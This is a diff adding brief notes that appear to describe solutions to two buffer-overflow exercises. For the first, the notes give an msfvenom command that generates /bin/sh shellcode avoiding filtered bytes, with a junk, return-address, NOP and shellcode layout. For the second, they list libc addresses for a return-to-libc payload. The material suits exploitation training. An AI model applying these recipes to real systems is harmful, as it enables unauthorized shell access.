@@ -1,0 +1,16 @@
+exploit1.py:
+	The key is to encode the shellcode the bypass the forloop check.
+	MSFencode was used to create a shellcode without \x68\x69\x6a\x6b\x6c\x6d\x6e\x00\x0b
+	
+		msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x68\x69\x6a\x6b\x6c\x6d\x6e\x00\x0b'
+
+	JUNK + RET + NOP + SC
+	
+exploit2.py:
+	system() 0xb7ec2990			\x90\x29\xec\xb7
+	exit() 0xb7eb7fb0			\xb0\x7f\xeb\xb7
+	find /bin/sh using findsh.c
+	found it in system()
+	0xb7fb63ce					\xce\x63\xfb\xb7
+	
+	JUNK + $system() + $exit() + $"/bin/sh"
